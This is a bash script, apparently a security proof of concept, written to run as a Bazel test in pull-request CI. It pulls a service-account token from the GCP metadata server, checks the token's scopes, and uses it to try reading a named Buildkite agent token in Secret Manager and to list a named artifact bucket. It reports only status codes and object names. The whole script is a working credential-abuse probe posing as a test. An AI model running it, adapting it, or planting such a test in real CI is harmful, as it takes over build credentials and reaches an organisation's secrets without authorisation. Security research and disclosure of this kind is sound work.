#!/bin/bash
# SC-C2 probe, test-target path. Status-code-only output. Never prints a token value.
# Runs as a Bazel sh_test with the requires-network tag in the Bazel PR CI job.
# Exits 0 always: the printed output is the evidence, not the exit code.

echo "== PROBE STEP 1: metadata server reachability (service-account email only) =="
curl -s --max-time 10 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email" || echo "STEP1 FAILED"

echo "== PROBE STEP 2: token expiry and scopes only (token never printed) =="
TOKEN="$(curl -s --max-time 10 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")" || TOKEN=""
if [ -z "$TOKEN" ]; then
  echo "STEP2 NO TOKEN OBTAINED"
else
  curl -s --max-time 10 "https://oauth2.googleapis.com/tokeninfo?access_token=$TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print('expires_in:', d.get('expires_in')); print('scope:', d.get('scope'))" || echo "STEP2 TOKENINFO FAILED"
fi

if [ -z "$TOKEN" ]; then
  echo "== PROBE STEP 3: SKIPPED (no token) =="
  echo "== PROBE STEP 4: SKIPPED (no token) =="
else
  echo "== PROBE STEP 3: Secret Manager status codes only (never the body) =="
  curl -s --max-time 10 -o /dev/null -w "secret GET status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token" || echo "STEP3 GET FAILED"
  curl -s --max-time 10 -o /dev/null -w "secret versions:access status: %{http_code}\n" -H "Authorization: Bearer $TOKEN" -X POST "https://secretmanager.googleapis.com/v1/projects/bazel-untrusted/secrets/bazel-buildkite-agent-token/versions/latest:access" || echo "STEP3 ACCESS FAILED"
  echo "== PROBE STEP 4: artifact bucket object names only (first 5, no downloads) =="
  curl -s --max-time 10 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b/bazel-untrusted-buildkite-artifacts/o" | python3 -c "import sys,json; print([i['name'] for i in json.load(sys.stdin).get('items',[])][:5])" || echo "STEP4 FAILED"
fi

exit 0
